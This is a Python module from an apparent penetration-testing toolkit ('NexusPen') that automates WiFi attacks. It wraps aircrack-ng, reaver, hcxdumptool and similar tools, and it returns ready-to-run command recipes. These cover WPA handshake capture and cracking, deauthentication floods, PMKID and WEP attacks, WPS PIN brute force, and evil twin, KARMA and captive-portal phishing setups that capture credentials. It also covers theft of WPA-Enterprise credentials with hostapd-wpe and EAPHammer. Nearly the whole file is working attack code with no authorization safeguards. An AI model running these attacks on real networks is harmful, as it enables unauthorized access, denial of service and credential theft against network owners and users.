#!/usr/bin/env python3
"""
NexusPen - WiFi Attacks Module
===============================
Comprehensive WiFi attack techniques.
"""

import subprocess
import os
import time
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class CapturedHandshake:
    """Captured WPA/WPA2 handshake."""
    bssid: str
    essid: str
    channel: int
    capture_file: str
    client_mac: Optional[str] = None


@dataclass
class CrackedPassword:
    """Cracked WiFi password."""
    essid: str
    bssid: str
    password: str
    security_type: str


class WPAAttacks:
    """
    WPA/WPA2 attack techniques.
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.monitor_interface = f'{interface}mon'
        self.handshakes: List[CapturedHandshake] = []
    
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode on interface."""
        console.print(f"\n[cyan]📡 Enabling monitor mode on {self.interface}...[/cyan]")
        
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Enable monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', self.interface],
                capture_output=True, text=True
            )
            
            if 'monitor mode' in result.stdout.lower() or self.monitor_interface in result.stdout:
                console.print(f"[green]✓ Monitor mode enabled: {self.monitor_interface}[/green]")
                return True
                
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode."""
        subprocess.run(['airmon-ng', 'stop', self.monitor_interface], capture_output=True)
        console.print("[green]✓ Monitor mode disabled[/green]")
    
    def scan_networks(self, duration: int = 30, output_file: str = 'scan') -> str:
        """Scan for WiFi networks."""
        console.print(f"\n[cyan]📡 Scanning networks for {duration}s...[/cyan]")
        
        cmd = [
            'airodump-ng',
            '--write', output_file,
            '--output-format', 'csv,cap',
            self.monitor_interface
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(duration)
            process.terminate()
            
            return f"{output_file}-01.csv"
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            return ""
    
    def capture_handshake(self, bssid: str, channel: int, essid: str,
                         output_file: str = 'handshake',
                         timeout: int = 300) -> Optional[CapturedHandshake]:
        """Capture WPA/WPA2 handshake."""
        console.print(f"\n[cyan]🤝 Capturing handshake for {essid}...[/cyan]")
        
        # Start capture on specific channel
        cmd = [
            'airodump-ng',
            '-c', str(channel),
            '--bssid', bssid,
            '-w', output_file,
            self.monitor_interface
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for handshake (with deauth)
            start_time = time.time()
            handshake_captured = False
            
            while time.time() - start_time < timeout:
                # Check if handshake captured
                cap_file = f"{output_file}-01.cap"
                if os.path.exists(cap_file):
                    check = subprocess.run(
                        ['aircrack-ng', cap_file],
                        capture_output=True, text=True
                    )
                    if '1 handshake' in check.stdout:
                        handshake_captured = True
                        break
                
                time.sleep(5)
            
            process.terminate()
            
            if handshake_captured:
                handshake = CapturedHandshake(
                    bssid=bssid,
                    essid=essid,
                    channel=channel,
                    capture_file=cap_file
                )
                self.handshakes.append(handshake)
                console.print(f"[green]✓ Handshake captured![/green]")
                return handshake
            else:
                console.print("[yellow]⚠️ No handshake captured[/yellow]")
                
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return None
    
    def deauth_attack(self, bssid: str, client: str = None,
                     count: int = 10) -> bool:
        """Send deauthentication packets."""
        console.print(f"\n[cyan]💥 Sending deauth to {bssid}...[/cyan]")
        
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid]
        
        if client:
            cmd.extend(['-c', client])
        
        cmd.append(self.monitor_interface)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            console.print(f"[green]✓ Sent {count} deauth packets[/green]")
            return True
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            return False
    
    def crack_handshake(self, cap_file: str, wordlist: str,
                       essid: str = None) -> Optional[CrackedPassword]:
        """Crack captured handshake with wordlist."""
        console.print(f"\n[cyan]🔓 Cracking handshake...[/cyan]")
        
        cmd = ['aircrack-ng', '-w', wordlist, cap_file]
        
        if essid:
            cmd.extend(['-e', essid])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            if 'KEY FOUND!' in result.stdout:
                # Extract password
                for line in result.stdout.split('\n'):
                    if 'KEY FOUND!' in line:
                        password = line.split('[')[2].split(']')[0].strip()
                        console.print(f"[green]✓ Password found: {password}[/green]")
                        return CrackedPassword(
                            essid=essid or 'Unknown',
                            bssid='',
                            password=password,
                            security_type='WPA/WPA2'
                        )
            else:
                console.print("[yellow]⚠️ Password not found in wordlist[/yellow]")
                
        except subprocess.TimeoutExpired:
            console.print("[yellow]⚠️ Cracking timeout[/yellow]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return None
    
    def crack_with_hashcat(self, cap_file: str, wordlist: str) -> str:
        """Crack with hashcat (GPU accelerated)."""
        console.print(f"\n[cyan]🔥 Converting for hashcat...[/cyan]")
        
        # Convert to hccapx format
        hccapx_file = cap_file.replace('.cap', '.hccapx')
        
        try:
            # Use cap2hccapx or hashcat-utils
            subprocess.run(
                ['cap2hccapx', cap_file, hccapx_file],
                capture_output=True
            )
            
            # Or use hashcat directly with hc22000 format
            hc22000_file = cap_file.replace('.cap', '.hc22000')
            subprocess.run(
                ['hcxpcapngtool', '-o', hc22000_file, cap_file],
                capture_output=True
            )
            
            cmd = f'''
# Hashcat WPA/WPA2 cracking
# Mode 22000 for PMKID + EAPOL (recommended)
hashcat -m 22000 {hc22000_file} {wordlist} -O --force

# Or older mode 2500 for hccapx
hashcat -m 2500 {hccapx_file} {wordlist} -O --force

# With rules
hashcat -m 22000 {hc22000_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule
'''
            console.print(cmd)
            return cmd
            
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
            return ""


class PMKIDAttack:
    """
    PMKID attack (clientless WPA attack).
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
    
    def capture_pmkid(self, bssid: str = None, channel: int = None,
                     output_file: str = 'pmkid.pcapng') -> str:
        """Capture PMKID without client."""
        console.print(f"\n[cyan]🔑 Capturing PMKID...[/cyan]")
        
        cmd = ['hcxdumptool', '-i', self.interface, '-o', output_file]
        
        if bssid:
            # Create filterlist
            with open('/tmp/filterlist.txt', 'w') as f:
                f.write(bssid.replace(':', ''))
            cmd.extend(['--filterlist_ap=/tmp/filterlist.txt', '--filtermode=2'])
        
        if channel:
            cmd.extend(['-c', str(channel)])
        
        console.print(f"[dim]Running: {' '.join(cmd)}[/dim]")
        console.print("[yellow]Press Ctrl+C when PMKID is captured[/yellow]")
        
        return f'''
# Capture PMKID
{' '.join(cmd)}

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 {output_file}

# Crack with hashcat
hashcat -m 22000 pmkid.hc22000 /path/to/wordlist.txt
'''
    
    @staticmethod
    def pmkid_attack_workflow() -> str:
        """Complete PMKID attack workflow."""
        return '''
# PMKID Attack Workflow (Clientless WPA crack)

# 1. Install tools
apt install hcxdumptool hcxtools hashcat

# 2. Put interface in monitor mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# 3. Capture PMKID
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1

# 4. Convert to hashcat format
hcxpcapngtool -o hashes.hc22000 capture.pcapng

# 5. Crack with hashcat
hashcat -m 22000 hashes.hc22000 rockyou.txt -O

# Advantages:
# - No client needed
# - No waiting for handshake
# - Faster capture
'''


class WEPAttacks:
    """
    WEP attack techniques (legacy).
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
    
    def fake_authentication(self, bssid: str) -> bool:
        """Fake authentication with AP."""
        console.print(f"\n[cyan]🔐 Fake authentication with {bssid}...[/cyan]")
        
        cmd = ['aireplay-ng', '-1', '0', '-a', bssid, self.interface]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if 'Association successful' in result.stdout:
                console.print("[green]✓ Association successful[/green]")
                return True
        except:
            pass
        
        return False
    
    def arp_replay(self, bssid: str) -> str:
        """ARP request replay attack."""
        return f'''
# ARP Replay Attack
aireplay-ng -3 -b {bssid} {self.interface}

# This will capture and replay ARP packets to generate IVs
# Wait until you have 20,000+ IVs
'''
    
    def chopchop_attack(self, bssid: str) -> str:
        """ChopChop attack for WEP."""
        return f'''
# ChopChop Attack
aireplay-ng -4 -b {bssid} {self.interface}

# This decrypts a WEP packet without knowing the key
'''
    
    def fragmentation_attack(self, bssid: str) -> str:
        """Fragmentation attack for WEP."""
        return f'''
# Fragmentation Attack
aireplay-ng -5 -b {bssid} {self.interface}

# This obtains PRGA (Pseudo Random Generation Algorithm)
# Can be used to generate packets
'''
    
    def crack_wep(self, cap_file: str) -> str:
        """Crack WEP key."""
        return f'''
# Crack WEP key
aircrack-ng {cap_file}

# PTW attack (faster)
aircrack-ng -z {cap_file}

# Needs approximately:
# - 20,000 IVs for 64-bit key
# - 40,000 IVs for 128-bit key
'''


class WPSAttacks:
    """
    WPS attack techniques.
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
    
    def scan_wps_enabled(self) -> str:
        """Scan for WPS-enabled networks."""
        console.print("\n[cyan]📡 Scanning for WPS-enabled networks...[/cyan]")
        
        return '''
# Wash - scan for WPS
wash -i wlan0mon

# Airodump-ng with WPS info
airodump-ng --wps wlan0mon

# Look for:
# - WPS version
# - WPS locked status
# - WPS enabled status
'''
    
    def reaver_attack(self, bssid: str, channel: int) -> str:
        """Reaver WPS PIN attack."""
        console.print(f"\n[cyan]🔓 Reaver attack on {bssid}...[/cyan]")
        
        return f'''
# Reaver WPS PIN brute force
reaver -i wlan0mon -b {bssid} -c {channel} -vv

# With delay (avoid lockout)
reaver -i wlan0mon -b {bssid} -c {channel} -vv -d 2 -l 60

# Pixie Dust attack (faster)
reaver -i wlan0mon -b {bssid} -c {channel} -vv -K 1

# Options:
# -d: delay between PINs
# -l: lockout delay
# -K 1: Pixie Dust attack
# -N: no NACK
# -S: small DH keys
'''
    
    def bully_attack(self, bssid: str, channel: int) -> str:
        """Bully WPS attack."""
        return f'''
# Bully WPS attack
bully wlan0mon -b {bssid} -c {channel} -v 3

# Pixie Dust with Bully
bully wlan0mon -b {bssid} -c {channel} -d -v 3

# Options:
# -d: Pixie Dust attack
# -v: verbosity level
# -F: force despite WPS locked
'''
    
    def pixie_dust(self, bssid: str, channel: int) -> str:
        """Pixie Dust offline attack."""
        return f'''
# Pixie Dust Attack (offline WPS PIN recovery)
# Works on vulnerable implementations

# Using Reaver
reaver -i wlan0mon -b {bssid} -c {channel} -K 1 -vv

# Using Bully
bully wlan0mon -b {bssid} -c {channel} -d -v 3

# Using wifite
wifite --wps-only --pixie

# Vulnerable chipsets:
# - Ralink
# - MediaTek (some)
# - Realtek (some)
# - Broadcom (some older)
'''
    
    @staticmethod
    def null_pin_attack() -> str:
        """Null PIN attack."""
        return '''
# Null PIN Attack (CVE-2017-2566)
# Some routers accept empty/null PIN

reaver -i wlan0mon -b [BSSID] -c [CH] -vv -p ""
reaver -i wlan0mon -b [BSSID] -c [CH] -vv -p "        "

# Some devices use PIN: 12345670
reaver -i wlan0mon -b [BSSID] -c [CH] -vv -p 12345670
'''


class EvilTwin:
    """
    Evil Twin / Rogue AP attacks.
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
    
    def create_evil_twin(self, essid: str, channel: int) -> str:
        """Create Evil Twin AP."""
        return f'''
# Evil Twin Attack Setup

# 1. Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface={self.interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# 2. Configure interface
ip link set {self.interface} down
ip addr add 192.168.1.1/24 dev {self.interface}
ip link set {self.interface} up

# 3. Configure DHCP (dnsmasq)
cat > /tmp/dnsmasq.conf << EOF
interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 4. Start services
hostapd /tmp/hostapd.conf &
dnsmasq -C /tmp/dnsmasq.conf -d &

# 5. Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
'''
    
    def karma_attack(self) -> str:
        """KARMA attack (respond to all probe requests)."""
        return f'''
# KARMA Attack
# Respond to all WiFi probe requests

# Using hostapd-wpe
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Using Airbase-ng
airbase-ng -c 6 -P -C 60 -e "Free WiFi" {self.interface}

# Using Wifiphisher
wifiphisher --essid "Free WiFi" -kK

# KARMA will respond to any SSID the client probes for
'''
    
    def captive_portal(self, essid: str) -> str:
        """Captive portal phishing."""
        return f'''
# Captive Portal Attack

# 1. Use Wifiphisher
wifiphisher -aI {self.interface} -eI eth0 --essid "{essid}"

# 2. Choose phishing template:
#    - Firmware upgrade
#    - OAuth login
#    - Browser plugin
#    - Network manager connect

# Manual setup:
# 1. Create evil twin
# 2. Redirect all HTTP to captive portal
# 3. Capture credentials

# iptables rules for captive portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
'''
    
    @staticmethod
    def hostapd_wpe() -> str:
        """hostapd-wpe for enterprise attacks."""
        return '''
# hostapd-wpe (Wireless Pwnage Edition)
# For attacking WPA-Enterprise / 802.1X

# 1. Generate certificates
cd /etc/hostapd-wpe/certs
./bootstrap

# 2. Configure hostapd-wpe.conf
interface=wlan0
ssid=CorpWiFi
channel=6
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh

# 3. Run
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials in /var/log/hostapd-wpe.log
# Format: username:challenge:response

# Crack with asleap
asleap -C [challenge] -R [response] -W /path/to/wordlist
'''


class EnterpriseAttacks:
    """
    WPA-Enterprise / 802.1X attacks.
    """
    
    @staticmethod
    def eaphammer() -> str:
        """EAPHammer for enterprise attacks."""
        return '''
# EAPHammer - Targeted evil twin attacks against WPA-Enterprise

# Install
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup

# Generate certs
./eaphammer --cert-wizard

# GTC Downgrade attack (capture cleartext creds)
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "CorpWiFi" --creds

# Hostile portal
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "CorpWiFi" --hostile-portal

# PMKID capture
./eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "CorpWiFi" --pmkid
'''
    
    @staticmethod
    def wpa_enterprise_crack() -> str:
        """Crack WPA-Enterprise credentials."""
        return '''
# Crack captured EAP credentials

# PEAP/MSCHAPv2 (NetNTLMv1)
# Format from hostapd-wpe: user:::challenge:response
john --format=netntlm captured.txt

# hashcat
hashcat -m 5500 captured.txt wordlist.txt

# asleap (for LEAP/MSCHAPv2)
asleap -C [challenge] -R [response] -W wordlist.txt

# If you captured RADIUS traffic:
eapmd5tojohn capture.pcap > hashes.txt
john hashes.txt
'''
    
    @staticmethod
    def freeradius_wpe() -> str:
        """FreeRADIUS-WPE setup."""
        return '''
# FreeRADIUS-WPE for credential capture

# Install
git clone https://github.com/Brad-Anton/freeradius-wpe.git
cd freeradius-wpe
./configure
make
make install

# Configure hostapd to use FreeRADIUS-WPE
# Credentials logged to /var/log/freeradius-server-wpe.log
'''
